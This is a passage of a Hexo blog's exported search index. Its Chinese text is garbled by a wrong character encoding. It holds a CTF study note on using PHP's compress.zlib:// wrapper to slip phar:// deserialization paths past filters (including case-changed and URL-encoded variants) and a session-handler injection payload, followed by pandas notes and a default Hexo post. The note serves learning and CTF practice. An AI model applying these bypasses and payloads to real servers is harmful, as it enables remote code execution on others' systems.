title="1. åŸºæœ¬æ¦‚å¿µ"></a><strong>1. åŸºæœ¬æ¦‚å¿µ</strong></h4><p><code>compress.zlib://</code> æ˜¯ PHP å†…ç½®çš„ <strong>æµåŒ…è£…å™¨</strong>ï¼Œç”¨äºåœ¨è¯»å†™æ–‡ä»¶æ—¶ <strong>è‡ªåŠ¨è¿›è¡Œ zlibï¼ˆDEFLATEï¼‰å‹ç¼©æˆ–è§£å‹</strong>ã€‚</p><p>å®ƒå¯ä»¥è®©ä½ åœ¨æ–‡ä»¶å‡½æ•°ä¸­ï¼ˆ<code>fopen()</code>, <code>file_get_contents()</code>, <code>md5_file()</code> ç­‰ï¼‰ç›´æ¥æ“ä½œå‹ç¼©å†…å®¹ï¼Œè€Œä¸éœ€è¦æ‰‹åŠ¨è°ƒç”¨ <code>gzcompress()</code> &#x2F; <code>gzuncompress()</code>ã€‚</p><hr><h4 id="2-åŸºæœ¬è¯­æ³•"><a href="#2-åŸºæœ¬è¯­æ³•" class="headerlink" title="2. åŸºæœ¬è¯­æ³•"></a><strong>2. åŸºæœ¬è¯­æ³•</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//&lt;å®é™…æ–‡ä»¶è·¯å¾„&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//&lt;å…¶å®ƒæµåŒ…è£…å™¨è·¯å¾„&gt;</span></span><br></pre></td></tr></table></figure><p><strong>è§£é‡Šï¼š</strong></p><ul><li><code>compress.zlib://</code> æ˜¯å¤–å±‚åŒ…è£…å™¨ã€‚</li><li><code>&lt;å®é™…æ–‡ä»¶è·¯å¾„&gt;</code> å¯ä»¥æ˜¯æœ¬åœ°æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯å¦ä¸€ä¸ªæµåŒ…è£…å™¨ï¼ˆä¾‹å¦‚ <code>phar://</code>ï¼‰ã€‚</li></ul><hr><h4 id="3-å¸¸è§ç”¨é€”"><a href="#3-å¸¸è§ç”¨é€”" class="headerlink" title="3. å¸¸è§ç”¨é€”"></a><strong>3. å¸¸è§ç”¨é€”</strong></h4><h5 id="1-è¯»å–-gzip-å‹ç¼©çš„æ–‡ä»¶"><a href="#1-è¯»å–-gzip-å‹ç¼©çš„æ–‡ä»¶" class="headerlink" title="(1) è¯»å– gzip å‹ç¼©çš„æ–‡ä»¶"></a><strong>(1) è¯»å– gzip å‹ç¼©çš„æ–‡ä»¶</strong></h5><p>å‡è®¾æœ‰ä¸ª <code>data.txt.gz</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;compress.zlib://data.txt.gz&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>; <span class="comment">// è‡ªåŠ¨è§£å‹åè¾“å‡ºåŸæ–‡</span></span><br></pre></td></tr></table></figure><p>ç›¸å½“äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gzdecode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;data.txt.gz&quot;</span>));</span><br></pre></td></tr></table></figure><hr><h5 id="2-å†™å…¥æ—¶è‡ªåŠ¨å‹ç¼©"><a href="#2-å†™å…¥æ—¶è‡ªåŠ¨å‹ç¼©" class="headerlink" title="(2) å†™å…¥æ—¶è‡ªåŠ¨å‹ç¼©"></a><strong>(2) å†™å…¥æ—¶è‡ªåŠ¨å‹ç¼©</strong></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;compress.zlib://data.txt.gz&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="comment">// ç»“æœï¼šdata.txt.gz æ˜¯å‹ç¼©è¿‡çš„</span></span><br></pre></td></tr></table></figure><hr><h5 id="3-ä¸å…¶ä»–åŒ…è£…å™¨åµŒå¥—"><a href="#3-ä¸å…¶ä»–åŒ…è£…å™¨åµŒå¥—" class="headerlink" title="(3) ä¸å…¶ä»–åŒ…è£…å™¨åµŒå¥—"></a><strong>(3) ä¸å…¶ä»–åŒ…è£…å™¨åµŒå¥—</strong></h5><p><code>compress.zlib://</code> å¯ä»¥åŒ…è£¹å¦ä¸€ä¸ªæµåŒ…è£…å™¨ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//phar://upload/payload.phar/test.txt</span></span><br></pre></td></tr></table></figure><p>è¿™ä¼šå…ˆé€šè¿‡ <code>phar://</code> æ‰“å¼€ <code>upload/payload.phar</code> é‡Œçš„ <code>test.txt</code>ï¼Œç„¶å<strong>æŠŠå†…å®¹äº¤ç»™ zlib è§£å‹</strong>ã€‚</p><hr><h4 id="4-åœ¨-PHAR-ååºåˆ—åŒ–ä¸­çš„ä½œç”¨"><a href="#4-åœ¨-PHAR-ååºåˆ—åŒ–ä¸­çš„ä½œç”¨" class="headerlink" title="4. åœ¨ PHAR ååºåˆ—åŒ–ä¸­çš„ä½œç”¨"></a><strong>4. åœ¨ PHAR ååºåˆ—åŒ–ä¸­çš„ä½œç”¨</strong></h4><p>åœ¨ PHAR ååºåˆ—åŒ–åˆ©ç”¨ä¸­ï¼Œ<code>compress.zlib://</code> å¸¸ç”¨äº <strong>ç»•è¿‡è¿‡æ»¤</strong>ï¼š</p><ul><li>ä¸€äº› WAF æˆ–ä»£ç åªæ£€æµ‹å‚æ•°é‡Œæœ‰æ²¡æœ‰ <code>phar://</code> å¼€å¤´çš„è·¯å¾„ã€‚</li><li>é€šè¿‡ <code>compress.zlib://phar://...</code>ï¼Œ<code>phar://</code> å°±ä¸åœ¨æœ€å‰é¢ï¼Œå¯èƒ½é€ƒè¿‡æ£€æŸ¥ã€‚</li><li>ä½†æ˜¯ <strong>PHP å†…éƒ¨ä¾ç„¶ä¼šè°ƒç”¨ PHAR è§£æå™¨</strong>ï¼Œç…§æ ·ä¼šå»è¯»å– PHAR çš„ metadata â†’ è§¦å‘ unserialize â†’ æ‰§è¡Œæ¶æ„ <code>__destruct()</code> &#x2F; <code>__wakeup()</code>ã€‚</li></ul><p><strong>é‡è¦ç»†èŠ‚ï¼š</strong></p><ul><li><p>å¿…é¡»å†™ä¸Š <strong>å†…éƒ¨æ–‡ä»¶è·¯å¾„</strong>ï¼Œå¦åˆ™ PHAR æ‰“ä¸å¼€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ… compress.zlib://phar://upload/payload.png/test.txt</span><br><span class="line">âŒ compress.zlib://phar://upload/payload.png  // ä¼šæŠ¥é”™</span><br></pre></td></tr></table></figure></li><li><p>å³ä½¿è§£å‹å¤±è´¥ï¼ˆå› ä¸ºæ–‡ä»¶æ²¡å‹ç¼©è¿‡ï¼‰ï¼Œ<strong>PHAR å…ƒæ•°æ®çš„ååºåˆ—åŒ–åœ¨è§£å‹å‰å°±å‘ç”Ÿ</strong>ï¼Œæ‰€ä»¥ payload ä¸€æ ·èƒ½è§¦å‘ã€‚</p></li><li><p>å¦‚æœæƒ³è®© zlib å±‚æ­£å¸¸è§£å‹ï¼Œå¯ä»¥åœ¨ç”Ÿæˆ PHAR æ—¶å‹ç¼© entryï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">compressFiles</span>(<span class="title class_">Phar</span>::<span class="variable constant_">GZ</span>); <span class="comment">// å‹ç¼©æ‰€æœ‰æ–‡ä»¶</span></span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="5-å¸¸è§å®‰å…¨åˆ©ç”¨åœºæ™¯"><a href="#5-å¸¸è§å®‰å…¨åˆ©ç”¨åœºæ™¯" class="headerlink" title="5. å¸¸è§å®‰å…¨åˆ©ç”¨åœºæ™¯"></a><strong>5. å¸¸è§å®‰å…¨åˆ©ç”¨åœºæ™¯</strong></h4><ol><li><p><strong>è¿‡æ»¤ç»•è¿‡</strong></p><ul><li><p>è¿‡æ»¤ <code>phar://</code> â†’ ç”¨ <code>compress.zlib://phar://</code>ã€‚</p></li><li><p>ç»“åˆå¤§å°å†™ã€URL ç¼–ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://pHaR://...</span><br><span class="line">compress.zlib://%70har://...</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>æ··æ·†æµè·¯å¾„</strong></p><ul><li>å®‰å…¨äººå‘˜æŸ¥æ—¥å¿—æ—¶å¯èƒ½å¿½ç•¥è¿™ç§â€œå¤šå±‚â€åŒ…è£…å™¨ï¼Œæ”»å‡»é“¾éšè—æ€§æ›´é«˜ã€‚</li></ul></li><li><p><strong>å…¼å®¹æ€§åˆ©ç”¨</strong></p><ul><li>æŸäº›è€ç‰ˆæœ¬ PHP è§£æå™¨åœ¨å¤„ç†å¤šå±‚åŒ…è£…å™¨æ—¶ä¼šèµ°ä¸åŒä»£ç è·¯å¾„ï¼Œå¯èƒ½ç»•è¿‡ <code>allow_url_fopen</code> æˆ–æ–‡ä»¶è·¯å¾„æ ¡éªŒã€‚</li></ul></li></ol><hr><h4 id="6-æµç¨‹å›¾ï¼ˆcompress-zlib-phar-ï¼‰"><a href="#6-æµç¨‹å›¾ï¼ˆcompress-zlib-phar-ï¼‰" class="headerlink" title="6. æµç¨‹å›¾ï¼ˆcompress.zlib://phar://ï¼‰"></a><strong>6. æµç¨‹å›¾ï¼ˆ<code>compress.zlib://phar://</code>ï¼‰</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">md5_file(&quot;compress.zlib://phar://upload/payload.png/test.txt&quot;)</span><br><span class="line">       â”‚</span><br><span class="line">       â–¼</span><br><span class="line">compress.zlib wrapper æ‰“å¼€ inner stream</span><br><span class="line">       â”‚</span><br><span class="line">       â–¼</span><br><span class="line">phar:// wrapper è¢«è°ƒç”¨ â†’ è§£æ PHAR manifest</span><br><span class="line">       â”‚</span><br><span class="line">       â–¼</span><br><span class="line">ååºåˆ—åŒ– metadataï¼ˆæ¶æ„å¯¹è±¡åˆ›å»ºï¼‰</span><br><span class="line">       â”‚</span><br><span class="line">       â–¼</span><br><span class="line">åç»­å°è¯•è¯»å–å†…éƒ¨æ–‡ä»¶ â†’ äº¤ç»™ zlib è§£å‹</span><br></pre></td></tr></table></figure><p><strong>å…³é”®ç‚¹ï¼šååºåˆ—åŒ–åœ¨è§£å‹ä¹‹å‰å‘ç”Ÿ</strong>ï¼Œæ‰€ä»¥å³ä½¿è§£å‹å¤±è´¥ï¼Œpayload ä¾ç„¶æ‰§è¡Œã€‚</p><hr><h4 id="7-å°ç»“"><a href="#7-å°ç»“" class="headerlink" title="7. å°ç»“"></a><strong>7. å°ç»“</strong></h4><ul><li><code>compress.zlib://</code> æ˜¯ PHP çš„å‹ç¼©æµåŒ…è£…å™¨ï¼Œå¯ä»¥è¯»å†™ gzip&#x2F;zlib æ ¼å¼ã€‚</li><li>å¯ä»¥ä¸ <code>phar://</code> åµŒå¥—ï¼Œç”¨äº PHAR ååºåˆ—åŒ–æ¼æ´çš„ç»•è¿‡å’Œæ··æ·†ã€‚</li><li>è§¦å‘ååºåˆ—åŒ–çš„å…³é”®åœ¨äº <strong>PHAR wrapper ä¼šåœ¨è®¿é—®å†…éƒ¨ entry å‰è§£æå…ƒæ•°æ®</strong>ï¼Œä¸ zlib æ˜¯å¦è§£å‹æˆåŠŸæ— å…³ã€‚</li></ul><h2 id="13-session"><a href="#13-session" class="headerlink" title="13 session"></a>13 session</h2><p>PHP å¸Œæœ›ä¼šè¯æ–‡ä»¶é‡‡ç”¨ä»¥ä¸‹æ ¼å¼ï¼š</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">varname</span>&gt;</span>|<span class="tag">&lt;<span class="name">serialized_value</span>&gt;</span><span class="tag">&lt;<span class="name">next_var</span>&gt;</span>|<span class="tag">&lt;<span class="name">serialized_value</span>&gt;</span>...</span></span><br></pre></td></tr></table></figure><p>åœ¨<code>hint.php</code>ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];   <span class="comment">// you control this string</span></span><br></pre></td></tr></table></figure><p>å‘é€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><p>ä½ æ³¨å…¥çš„å­—ç¬¦ä¸²ä»¥ <code>|</code> å¼€å¤´ ï¼Œæ‰€ä»¥ <code>php</code> å¤„ç†ç¨‹åºä¼šå‘ç° | å¹¶å°†ä¹‹åçš„æ‰€æœ‰å†…å®¹è§†ä¸ºåºåˆ—åŒ–å€¼ã€‚è¯¥â€œå€¼â€ä»¥ Oï¼š4ï¼šâ€œFlagâ€â€¦ å¼€å¤´ï¼Œå› æ­¤ PHP å–æ¶ˆåºåˆ—åŒ–æ‚¨çš„å¯¹è±¡ ï¼Œè§¦å‘<code>__wakeup()</code>ã€‚</p><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas åŸºç¡€</title>
      <link href="/2025/07/26/pandas/"/>
      <url>/2025/07/26/pandas/</url>
      
        <content type="html"><![CDATA[<h1 id="pandas-2-Pandas-I-from-Spring-2025-â€“-Principles-and-Techniques-of-Data-Science"><a href="#pandas-2-Pandas-I-from-Spring-2025-â€“-Principles-and-Techniques-of-Data-Science" class="headerlink" title="pandas [[2  Pandas I (from Spring 2025) â€“ Principles and Techniques of Data Science]]"></a>pandas [[2  Pandas I (from Spring 2025) â€“ Principles and Techniques of Data Science]]</h1><h2 id="how-datas-are-organized"><a href="#how-datas-are-organized" class="headerlink" title="how datas are organized"></a>how datas are organized</h2><p>see table as DataFrame, and each column as a Series</p><h3 id="Series"><a href="#Series" class="headerlink" title="Series"></a>Series</h3><ul><li>a sequence of values of same type</li><li>a sequence of data labels called index</li></ul><h4 id="Selection-in-Series"><a href="#Selection-in-Series" class="headerlink" title="Selection in Series"></a>Selection in Series</h4><ul><li>by a single label or a list of labels: <code>s[[labels]]</code></li><li>by a filtering condition: <code>s[s &gt; 0]</code></li></ul><h3 id="DataFrame"><a href="#DataFrame" class="headerlink" title="DataFrame"></a>DataFrame</h3><h4 id="where-the-data-of-DataFrame-comes-from"><a href="#where-the-data-of-DataFrame-comes-from" class="headerlink" title="where the data of DataFrame comes from"></a>where the data of DataFrame comes from</h4><ul><li>csv file: <code>pd.read_csv(&#39;file.csv&#39;, index_col = &#39;year&#39;)</code></li><li>using a list: <code>pd.DataFrame([[1, 2], [3, 4]], columns=[&#39;A&#39;, &#39;B&#39;], index=[&#39;a&#39;, &#39;b&#39;])</code></li><li>using a dictionary: <code>pd.DataFrame(&#123;&#39;A&#39;: [1, 2], &#39;B&#39;: [3, 4]&#125;, index=[&#39;a&#39;, &#39;b&#39;])</code></li><li>using a Series:</li></ul><h4 id="about-index"><a href="#about-index" class="headerlink" title="about index"></a>about index</h4><ul><li>index can also have a name</li><li>do not have to be unique</li><li>These indices are the arbitrary numerical indices generated when we created the <code>DataFrame</code>. For example, <code>banana</code> was originally in row 2, and so it has row label 2. Note the distinction between the index <code>_label_</code>, and the actual index <code>_position_</code>.</li><li>can be set to specific column using <code>df.set_index(&lt;column&gt;)</code></li><li>can be reset to default using <code>df.reset_index()</code></li></ul><h4 id="DataFrame-API"><a href="#DataFrame-API" class="headerlink" title="DataFrame API"></a>DataFrame API</h4><p><a href="**%5Bhttps://pandas.pydata.org/docs/reference/api/pandas.DataFrame.html%5D(https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.html)**">API doc</a></p><ul><li><code>idxmax()</code> function returns the index of the first occurrence of the maximum value in a Series or DataFrame.</li><li><code>drop_duplicates()</code> function removes duplicate rows from a DataFrame.</li></ul><h4 id="Data-extraction"><a href="#Data-extraction" class="headerlink" title="Data extraction"></a>Data extraction</h4><ul><li><code>df.head(&lt;n&gt;)</code></li><li><code>df.tail(&lt;n&gt;)</code></li><li><code>df.loc[&lt;row_index&gt;, &lt;column_name&gt;]</code><ul><li>Note that if we request a single column but donâ€™t enclose it in a list, the return type of the <code>loc</code> operator is a <code>Series</code> rather than a <code>DataFrame</code></li><li><strong>reminder: a:b means [a,b]</strong></li></ul></li><li><code>df.iloc[&lt;row_integers&gt;, &lt;column_integers&gt;]</code></li><li><code>[]</code><ul><li>a slice of rows: <code>df[&lt;row_slice&gt;]</code></li><li>a list of column labels</li><li>a single column label</li><li><strong>reminder: a:b means [a,b)</strong></li><li>Note that slicing notation is not supported for columns if you use <code>[]</code> notation. Use <code>loc</code> instead.</li></ul></li></ul><h5 id="Boolean-Array-Input"><a href="#Boolean-Array-Input" class="headerlink" title="Boolean Array Input"></a>Boolean Array Input</h5><ul><li><code>.loc</code> and <code>[]</code> can take a boolean array as input</li></ul><h5 id="Boolean-choose"><a href="#Boolean-choose" class="headerlink" title="Boolean choose"></a>Boolean choose</h5><ul><li><code>df[df[&#39;column&#39;] &gt; 0]</code> returns rows where the value in â€˜columnâ€™ is greater than 0</li><li><code>df[df[&#39;column&#39;].isin([1, 2, 3])]</code> returns rows where the value in â€˜columnâ€™ is in the list <code>[1, 2, 3]</code></li><li><code>df[df[&#39;column&#39;].str.contains(&#39;pattern&#39;)]</code> returns rows where the value in â€˜columnâ€™ contains the substring â€˜patternâ€™</li></ul><h4 id="operations-on-DataFrame"><a href="#operations-on-DataFrame" class="headerlink" title="operations on DataFrame"></a>operations on DataFrame</h4><h5 id="add-modify-columns"><a href="#add-modify-columns" class="headerlink" title="add&#x2F;modify columns"></a>add&#x2F;modify columns</h5><ul><li>using <code>[]</code> to add a new column: <code>df[&#39;new_column&#39;] = [1, 2, 3]</code></li></ul><h5 id="rename-columns"><a href="#rename-columns" class="headerlink" title="rename columns"></a>rename columns</h5><ul><li>using <code>rename</code>: <code>df.rename(columns=&#123;&#39;old_name&#39;: &#39;new_name&#39;&#125;, inplace=True)</code></li></ul><h5 id="delete-columns"><a href="#delete-columns" class="headerlink" title="delete columns"></a>delete columns</h5><ul><li>using <code>drop</code>: <code>df.drop(columns=[&#39;column_to_delete&#39;], inplace=True)</code><ul><li>By default, <code>drop</code> does not modify the DataFrame in place, so you need to set <code>inplace=True</code> to apply the changes directly to the original DataFrame, or just assign the result to a new variable.</li></ul></li></ul><h4 id="useful-methods"><a href="#useful-methods" class="headerlink" title="useful methods"></a>useful methods</h4><ul><li>suport a range of methods from <code>numpy</code>, as long as the type is int.</li><li><code>size/shape</code></li><li><code>describe</code>: return a description of DataFrame</li><li><code>sample</code>: randomly select rows, replace can be set</li><li><code>value_counts</code>: return counts of unique values</li><li><code>sort_values</code>: sort by column values</li><li><code>unique</code>: return unique values</li></ul><h4 id="Group"><a href="#Group" class="headerlink" title="Group"></a>Group</h4><h5 id="Goal"><a href="#Goal" class="headerlink" title="Goal"></a>Goal</h5><p>Group data by one or more columns and perform aggregate operations on the grouped data.</p><h5 id="GroupBy"><a href="#GroupBy" class="headerlink" title="GroupBy"></a>GroupBy</h5><p>groupby generates a GroupBy object</p><p>we canâ€™t work with GroupBy object directly, we need to apply an aggregation function(to reduce the dimension of table)(a function that aggregates several values into one summary value) to it.<br><code>grouped = df.groupby(&#39;column_name&#39;).agg(&#123;&#39;other_column&#39;: &#39;sum&#39;&#125;)</code></p><p>the column we grouped on will become the index</p><h6 id="Filtering-by-Group"><a href="#Filtering-by-Group" class="headerlink" title="Filtering by Group"></a><strong>Filtering by Group</strong></h6><p>it takes a function that returns true or false for each sub-DataFrame, where <code>True</code> means the group should be kept.</p><h6 id="look-into-DataFrame-groupby-ways"><a href="#look-into-DataFrame-groupby-ways" class="headerlink" title="look into DataFrame.groupby ways"></a><strong>look into DataFrame.groupby ways</strong></h6><p><code>grouped.groups()</code><br><code>grouped.get_group(&#39;group_name&#39;)</code></p><h6 id="Grouping-by-Multiple-Columns"><a href="#Grouping-by-Multiple-Columns" class="headerlink" title="Grouping by Multiple Columns"></a><strong>Grouping by Multiple Columns</strong></h6><ol><li>using a list of column names: <code>df.groupby([&#39;col1&#39;, &#39;col2&#39;])</code></li><li>using Pivot Table</li></ol><ul><li><code>index</code>: the column(s) to group by</li><li><code>columns</code>: the column(s) to pivot</li><li><code>values</code>: the column(s) to aggregate</li><li><code>aggfunc</code>: the aggregation function to apply</li></ul><h4 id="Joining-DataFrames"><a href="#Joining-DataFrames" class="headerlink" title="Joining DataFrames"></a>Joining DataFrames</h4>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> data_science </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/07/25/hello-world/"/>
      <url>/2025/07/25/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
